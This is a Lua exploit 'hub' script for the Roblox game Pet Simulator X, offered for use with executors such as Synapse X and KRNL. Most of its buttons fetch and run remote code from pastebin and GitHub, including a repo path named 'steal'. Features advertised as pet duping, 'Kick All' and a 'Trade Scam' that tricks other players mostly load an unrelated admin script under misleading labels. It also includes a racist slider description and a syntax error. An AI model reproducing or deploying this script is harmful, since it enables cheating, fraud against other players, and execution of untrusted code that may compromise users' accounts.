local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Pet Simulator X Hub V4.0", "Ocean")

-- MAIN
local Main = Window:NewTab("Main")
local MainSection = Main:NewSection("Best Pet Simulator X Hub Made By MediumGames")


MainSection:NewButton("Version 4.0", "", function()
    print("Clicked")
end)

MainSection:NewLabel("Discord")

MainSection:NewButton("MediumGames#2984", "", function()
    print("Clicked")
end)

MainSection:NewLabel("Dupe Status: WORKING")

MainSection:NewLabel("Dupe Supported for:")

MainSection:NewButton("Synapse X", "", function()
    print("Clicked")
end)

MainSection:NewButton("KRNL", "", function()
    print("Clicked")
end)

MainSection:NewButton("Arceus X", "", function()
    print("Clicked")
end)

MainSection:NewButton("Vega X", "", function()
    print("Clicked")
end)

MainSection:NewButton("Fluxus", "", function()
    print("Clicked")
end)

MainSection:NewButton("Coco Z", "", function()
    print("Clicked")
end)

MainSection:NewButton("Kiwi X", "", function()
    print("Clicked")
end)

MainSection:NewButton("Comet", "", function()
    print("Clicked")
end)

MainSection:NewButton("Oxygen U", "", function()
    print("Clicked")
end)

MainSection:NewButton("Novaline", "", function()
    print("Clicked")
end)

MainSection:NewButton("Dansploit", "", function()
    print("Clicked")
end)

MainSection:NewButton("Nihon", "", function()
    print("Clicked")
end)

local qwe = Window:NewTab("Player")
local qweSection = qwe:NewSection("Best Pet Simulator X Hub Made By MediumGames")


qweSection:NewButton("Fly", "Makes you Fly", function()
        repeat wait() 
        until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Head") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
    local mouse = game.Players.LocalPlayer:GetMouse() 
    repeat wait() until mouse
    local plr = game.Players.LocalPlayer 
    local torso = plr.Character.Head 
    local flying = false
    local deb = true 
    local ctrl = {f = 0, b = 0, l = 0, r = 0} 
    local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
    local maxspeed = 400 
    local speed = 5000 

    function Fly() 
    local bg = Instance.new("BodyGyro", torso) 
    bg.P = 9e4 
    bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
    bg.cframe = torso.CFrame 
    local bv = Instance.new("BodyVelocity", torso) 
    bv.velocity = Vector3.new(0,0.1,0) 
    bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
    repeat wait() 
    plr.Character.Humanoid.PlatformStand = true 
    if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
    speed = speed+.5+(speed/maxspeed) 
    if speed > maxspeed then 
    speed = maxspeed 
    end 
    elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
    speed = speed-1 
    if speed < 0 then 
    speed = 0 
    end 
    end 
    if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
    bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
    lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
    elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
    bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
    else 
    bv.velocity = Vector3.new(0,0.1,0) 
    end 
    bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
    until not flying 
    ctrl = {f = 0, b = 0, l = 0, r = 0} 
    lastctrl = {f = 0, b = 0, l = 0, r = 0} 
    speed = 0 
    bg:Destroy() 
    bv:Destroy() 
    plr.Character.Humanoid.PlatformStand = false 
    end 
    mouse.KeyDown:connect(function(key) 
    if key:lower() == "e" then 
    if flying then flying = false 
    else 
    flying = true 
    Fly() 
    end 
    elseif key:lower() == "w" then 
    ctrl.f = 1 
    elseif key:lower() == "s" then 
    ctrl.b = -1 
    elseif key:lower() == "a" then 
    ctrl.l = -1 
    elseif key:lower() == "d" then 
    ctrl.r = 1 
    end 
    end) 
    mouse.KeyUp:connect(function(key) 
    if key:lower() == "w" then 
    ctrl.f = 0 
    elseif key:lower() == "s" then 
    ctrl.b = 0 
    elseif key:lower() == "a" then 
    ctrl.l = 0 
    elseif key:lower() == "d" then 
    ctrl.r = 0 
    end 
    end)
    Fly()
end)

qweSection:NewSlider("WalkSpeed", "Makes you Walk Faster like a Black Men", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)

qweSection:NewButton("NoClip", "Makes you walk through walls", function()
            -- Farewell Infortality.
        -- Version: 2.82
        -- Instances:
        local ScreenGui = Instance.new("ScreenGui")
        local Frame = Instance.new("Frame")
        local Drag = Instance.new("TextButton")
        local TextButton = Instance.new("TextButton")
        local TextButton_2 = Instance.new("TextButton")
        local TextLabel = Instance.new("TextLabel")
        --Properties:
        ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        Frame.Parent = ScreenGui
        Frame.BackgroundColor3 = Color3.new(1, 1, 1)
        Frame.Position = UDim2.new(0.275453836, 0, 0.186732173, 0)
        Frame.Size = UDim2.new(0, 379, 0, 373)

        Drag.Name = "Drag"
        Drag.Parent = Frame
        Drag.BackgroundColor3 = Color3.new(1, 1, 1)
        Drag.BorderColor3 = Color3.new(0.917647, 0.917647, 0.917647)
        Drag.Size = UDim2.new(0, 379, 0, 27)
        Drag.Text = "Drag"
        Drag.TextColor3 = Color3.new(0, 0, 0)

        TextButton.Parent = Frame
        TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
        TextButton.Position = UDim2.new(0.261265785, 0, 0.352023244, 0)
        TextButton.Size = UDim2.new(0, 200, 0, 50)
        TextButton.Font = Enum.Font.SourceSans
        TextButton.Text = "Noclip R15"
        TextButton.TextColor3 = Color3.new(0, 0, 0)
        TextButton.TextSize = 14
        TextButton.MouseButton1Down:connect(function()
        nam = game.Players.LocalPlayer.Name

        game:GetService('RunService').Stepped:connect(function()
        for a, b in pairs(game.Workspace:GetChildren()) do
        if b.Name == nam then
        for i, v in pairs(game.Workspace[nam]:GetChildren()) do
        if v:IsA("BasePart") then
        v.CanCollide = false

        end
        end
        end
        end
        end)

        Workspace[nam].Head.Changed:connect(function()
        for a, b in pairs(game.Workspace:GetChildren()) do
        if b.Name == nam then
        for i, v in pairs(game.Workspace[nam]:GetChildren()) do
        if v:IsA("BasePart") then
        v.CanCollide = false

        end
        end
        end
        end
        end)
        end)

        TextButton_2.Parent = Frame
        TextButton_2.BackgroundColor3 = Color3.new(1, 1, 1)
        TextButton_2.Position = UDim2.new(0.261265785, 0, 0.615844727, 0)
        TextButton_2.Size = UDim2.new(0, 200, 0, 50)
        TextButton_2.Font = Enum.Font.SourceSans
        TextButton_2.Text = "Noclip R6"
        TextButton_2.TextColor3 = Color3.new(0, 0, 0)
        TextButton_2.TextSize = 14
        TextButton_2.MouseButton1Down:connect(function()
        game.Players.LocalPlayer.Character.Humanoid.MaxHealth = math.huge
        game.Players.LocalPlayer.Character.Humanoid.Health = math.huge
        while true do
            game:GetService("RunService").Stepped:wait()
            game.Players.LocalPlayer.Character.Head.CanCollide = false
            game.Players.LocalPlayer.Character.Torso.CanCollide = false
        end
        end)

        TextLabel.Parent = Frame
        TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
        TextLabel.Position = UDim2.new(0.104106054, 0, 0.111652002, 0)
        TextLabel.Size = UDim2.new(0, 299, 0, 50)
        TextLabel.Font = Enum.Font.SourceSans
        TextLabel.Text = "hack noclip (work all game)"
        TextLabel.TextColor3 = Color3.new(0, 0, 0)
        TextLabel.TextSize = 14
        TextLabel.TextWrapped = true
        -- Scripts:
        function SCRIPT_GBXM85_FAKESCRIPT() -- Drag.LocalScript 
            local script = Instance.new('LocalScript')
            script.Parent = Drag
            wanttobemoved=script.Parent.Parent
            X=wanttobemoved.Position.X.Offset
            Y=wanttobemoved.Position.Y.Offset
            XS=wanttobemoved.Position.X.Scale
            YS=wanttobemoved.Position.Y.Scale
            function down(posX,posY)--the positions of the mouse
                drag=true--activate the drag function
                X=wanttobemoved.Position.X.Offset--redefines the value "X"
                Y=wanttobemoved.Position.Y.Offset--redefines the value "Y"
                XS=wanttobemoved.Position.X.Scale
                YS=wanttobemoved.Position.Y.Scale
                DposX=posX-X--the mouse's X position offset by the frame's X position.
                DposY=posY-Y--the mouse's Y position offset by the frame's Y position.
                print(""..DposX..","..DposY.."")--remembers the values DposX and DposY in the output toolbar.
            end
            function up()
                drag=false--deactivate the drag
            end
            function move(posX,posY)--again, the positions of the mouse
                if drag then--if held down then
                    wanttobemoved.Position=UDim2.new(XS,posX - DposX,YS,posY - DposY)
                end
            end
            script.Parent.MouseButton1Down:connect(down)
            script.Parent.MouseButton1Up:connect(up)
            script.Parent.MouseLeave:connect(up)
            script.Parent.MouseMoved:connect(move)

        end
        coroutine.resume(coroutine.create(SCRIPT_GBXM85_FAKESCRIPT))
    end)

    qweSection:NewSlider("JumpPower", "Makes you Jump Higher", 350, 50, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
    end)

    qweSection:NewButton("Reset WS/JP", "Resets to all defaults", function()
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
    end)
    
    qweSection:NewButton("Friend All In Server", "Friends Everyone In The Server", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
    
    qweSection:NewButton("Unfriend All In Server", "Unfriends Everyone In The Server", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
    
    qweSection:NewToggle("Free Cam", "Spectate Mode", function(state)
        if state then
            loadstring(game:HttpGet("https://pastebin.com/raw/7Drm1b0H", true))()
        else
            loadstring(game:HttpGet("https://pastebin.com/raw/7Drm1b0H", true))()
        end
    end)
    
    local aaa = Window:NewTab("Pets")
    local aaaSection = aaa:NewSection("Best Pet Simulator X Hub Made By MediumGames")
    
    aaaSection:NewDropdown("Enchants", "DropdownInf", {"Coins V", "Fantasy Coins V", "Tech Coins V", "Rainbow Coins V", "Agility III", "Chest Breaker III", "Strenth V", "Super Teamwork", "Diamonds V", "Charm", "Gift III", "Glittering", "Magnet", "Royalty", "Companion III"}, function(currentOption)
        print("hi")
    end)

    aaaSection:NewToggle("Start Auto Enchant", "Starts the Auto Enchant", function(state)
        if state then
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
else
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end
    end)
    
    local aaaSection = aaa:NewSection("Auto Golden or Rainbow")
    
    aaaSection:NewSlider("Select Pet Amount", ".", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
    end)
    
    aaaSection:NewToggle("Auto Golden", ".", function(state)
        if state then
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
else
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end
    end)
    
    aaaSection:NewToggle("Auto Rainbow", ".", function(state)
        if state then
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
else
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end
    end)
    
    aaaSection:NewToggle("Start Auto Golden or Rainbow", ".", function(state)
        if state then
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
else
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end
    end)

    local qqq = Window:NewTab("Misc/World")
    local qqqSection = qqq:NewSection("Best Pet Simulator X Hub Made By MediumGames")

    qqqSection:NewButton("Anti AFK", "Makes you not go AFK log out", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
    end)
    
    qqqSection:NewButton("Anti Lag", "Removes Lag", function()
        loadstring(game:HttpGet("https://pastebin.com/raw/fBA8Q3Qi", true))()
    end)

    qqqSection:NewButton("Chat Spoofer", "Lest you chat for other people.", function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
    end)

    qqqSection:NewButton("Reset Character", "Press Q to Reset.", function()
    -- Not owned by me, Credits to the original owner
    -- Press q to reset yourself
    -- Good for games that dont allows you to reset
    -- Xfer was here (T.V.K)

    local Player = game:GetService("Players").LocalPlayer
    local Mouse = Player:GetMouse()

    Mouse.KeyDown:Connect(function(key)
        if key == "q" then

    local plr = game.Players.LocalPlayer --tells the script what plr is
    local humanoid = plr.Character.Humanoid
    local position = plr.Character.HumanoidRootPart.CFrame
    wait(0.1)
    humanoid:Destroy()
    plr:ClearAllChildren() --clears all of the plr instance aka the local player
    wait(5.25)
    plr.Character.HumanoidRootPart.CFrame = position
        end
    end)
end)
    
qqqSection:NewButton("Kick All", "Kicks everyone in the Server.", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
    
local www = Window:NewTab("Dupes")
local wwwSection = www:NewSection("NOTE: Must have Tier 3 or above Bank.")

local wwwSection = www:NewSection("This only works with Huges, Exclusvies and Gems.")

local wwwSection = www:NewSection("If done wrong, your pets will be Deleted!")

wwwSection:NewButton("Dupe Gems", "Dupes your gems, works 80 percent of the time.", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

wwwSection:NewButton("Dupe Huges", "Dupes your Huges, works 80 percent of the time.", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

wwwSection:NewButton("Dupe Exclusives", "Dupes your Exclusives, works 80 percent of the time.", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

wwwSection:NewButton("Dupe Equiped Pets", "Dupes your Gems, Huges and Excsluives works 80 percent of the time.", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

local wwwSection = www:NewSection("After clicking on any Dupe")
local wwwSection = www:NewSection("Leave game and rejoin after 5 mins.")

local rrr = Window:NewTab("Trade")
local rrrSection = rrr:NewSection("Best Pet Simulator X Hub Made By MediumGames")

rrrSection:NewButton("Trade Scam", "Place your pets in there and remove it, then click on this button. In their view it will be as you have pets kept in there.", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

local rrrSection = rrr:NewSection("Trade someone and select a pet.")

local rrrSection = rrr:NewSection("Click on the Trade Scam Funtion and remove the pet.")

local rrrSection = rrr:NewSection("And accept the trade")

local ccc = Window:NewTab("Other")
local cccSection = ccc:NewSection("Scripts")

cccSection:NewButton("Infinite Yield", "One of the best scripts out there in all games.", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

cccSection:NewButton("Thunder Z", "Works in Pet Simulator X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-HUB/HUB/main/Script"))()
end)

cccSection:NewButton("BK Hub", "Works in Pet Simulator X", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua"))()
end)

cccSection:NewButton("Moonlight", "Works in Pet Simulator X", function()
    loadstring(game:HttpGet('https://cookie-hosting.xyz/Roblox/Moonlight/Loader.lua'))()
end)

cccSection:NewButton("Unlock All Gamepasses", "Unlocks every Gamepasses", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/souhail1231111111/steal/main/Sa", true))() 
end)

local moo = Window:NewTab("NEW Cat Update!")
local mooSection = moo:NewSection("NEW CAT WORLD UPDATE HACKS!")

mooSection:NewButton("Auto Hatch Paw Egg", "", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/souhail1231111111/steal/main/Sa", true))() 

mooSection:NewButton("Auto Hatch Yarn Egg", "", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/souhail1231111111/steal/main/Sa", true))() 
end)

mooSection:NewButton("Auto Hatch Cat Egg", "", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/souhail1231111111/steal/main/Sa", true))() 
end)

    mooSection:NewToggle("Hatch 8 Eggs at a time", "Hatch 8 eggs instead of 1 or 3", function(state)
        if state then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/souhail1231111111/steal/main/Sa", true))() 
loadstring(game:HttpGet("https://raw.githubusercontent.com/souhail1231111111/steal/main/Sa", true))()         end
    end)

local vvv = Window:NewTab("More Coming Soon...")
local vvvSection = vvv:NewSection("Auto Farm Coming Soon...")